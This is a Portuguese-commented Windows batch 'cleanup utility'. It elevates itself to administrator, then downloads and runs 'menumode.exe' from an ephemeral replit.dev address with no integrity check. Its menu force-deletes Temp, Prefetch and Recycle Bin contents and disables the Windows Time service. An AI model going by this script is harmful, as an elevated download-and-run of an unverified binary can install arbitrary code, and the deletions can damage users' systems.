@echo off
setlocal

:: Verificar se o script está sendo executado como administrador
openfiles >nul 2>&1
if '%errorlevel%' == '0' goto Admin

:: Solicitar permissão de administrador para continuar
echo Solicite permissão de administrador para continuar...
powershell -Command "Start-Process '%~f0' -Verb RunAs"
if '%errorlevel%' NEQ '0' (
    echo A solicitação de permissões administrativas foi negada ou falhou.
    pause
    exit /b
)

:Admin
set "url=https://99e595d1-13c6-4e05-8507-d1e5c25fed8f-00-3tsqhihnomlbo.kirk.replit.dev/menumode.exe"

if not exist "%~dp0menumode.exe" (
    echo menumode.exe não encontrado. Baixando...
    powershell -Command "Invoke-WebRequest -Uri %url% -OutFile '%~dp0menumode.exe'"
    if %ERRORLEVEL% neq 0 (
        echo Falha ao baixar menumode.exe. Saindo...
        exit /b 1
    )
    echo Download concluído.
)

color 0A
title Windows Cleanup Utility

mode con: cols=80 lines=25
:menu
cls
echo =====================================
echo       Windows Cleanup Utility
echo =====================================
echo.
set "options[0]=Limpar pastas Temp"
set "options[1]=Limpar Prefetch"
set "options[2]=Limpar Lixeira"
set "options[3]=Otimizar Sistema"
set "options[4]=Reparar Arquivos do Sistema (SFC)"
set "options[5]=Verificar e Reparar Erros no Disco (CHKDSK)"
set "options[6]=Limpeza de Disco"
set "options[7]=Desfragmentar Disco"
set "options[8]=Executar Todos"
set "options[9]=Sair"

rem Exibir o menu e capturar a escolha do usuário
menumode f470 "%options[0]%" "%options[1]%" "%options[2]%" "%options[3]%" "%options[4]%" "%options[5]%" "%options[6]%" "%options[7]%" "%options[8]%" "%options[9]%"

if %ERRORLEVEL% == 1 goto clean_temp
if %ERRORLEVEL% == 2 goto clean_prefetch
if %ERRORLEVEL% == 3 goto clean_recyclebin
if %ERRORLEVEL% == 4 goto optimize_system
if %ERRORLEVEL% == 5 goto repair_system_files
if %ERRORLEVEL% == 6 goto check_repair_disk
if %ERRORLEVEL% == 7 goto disk_cleanup
if %ERRORLEVEL% == 8 goto defrag_disk
if %ERRORLEVEL% == 9 goto run_all
if %ERRORLEVEL% == 0 goto leave
goto leave

:clean_temp
cls
echo Limpando pastas Temp...
del /q /f /s %temp%\*
del /q /f /s C:\Windows\Temp\*
pause
goto menu

:clean_prefetch
cls
echo Limpando Prefetch...
del /q /f /s C:\Windows\Prefetch\*
pause
goto menu

:clean_recyclebin
cls
echo Limpando Lixeira...
rd /s /q C:\$Recycle.Bin
pause
goto menu

:optimize_system
cls
echo Otimizando Sistema...
:: Limpar cache DNS
ipconfig /flushdns

:: Ajustar o gerenciamento de energia
powercfg /hibernate off
powercfg /energy

:: Desabilitar serviços desnecessários
sc config "W32Time" start= disabled

:: Recriar o índice de pesquisa
pause
goto menu

:repair_system_files
cls
echo Reparando Arquivos do Sistema...
sfc /scannow
pause
goto menu

:check_repair_disk
cls
echo Verificando e Reparando Erros no Disco...
chkdsk C: /f /r
pause
goto menu

:disk_cleanup
cls
echo Executando Limpeza de Disco...
cleanmgr /sageset:1
cleanmgr /sagerun:1
pause
goto menu

:defrag_disk
cls
echo Desfragmentando Disco...
defrag C: /O /U /V
pause
goto menu

:run_all
cls
echo Executando todas as tarefas...
call :clean_temp
call :clean_prefetch
call :clean_recyclebin
call :optimize_system
call :repair_system_files
call :check_repair_disk
call :disk_cleanup
call :defrag_disk
pause
goto menu

:leave
cls
echo Saindo
exit
